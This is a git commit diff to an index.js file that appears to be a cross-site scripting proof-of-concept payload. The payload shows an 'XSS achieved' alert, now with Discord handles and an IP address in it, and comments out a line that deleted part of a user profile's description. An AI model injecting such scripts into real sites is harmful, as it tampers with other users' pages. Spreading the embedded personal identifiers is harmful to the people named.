870be7bf7470afe53a981772ae4ac5d08a3adb69
Sam <69408828+syntheticsam@users.noreply.github.com>
2025-08-20 17:11:23 +1200

    Update index.js

--- index.js
+++ index.js
@@ -1,2 +1,2 @@
-alert('XSS achieved!!! :3');
-document.querySelector('.userprofile .description div').remove();
+alert('XSS achieved!!! :3 ~ wntiv_, 162.159.137.232, amsaynz: on discord');
+// document.querySelector('.userprofile .description div').remove();
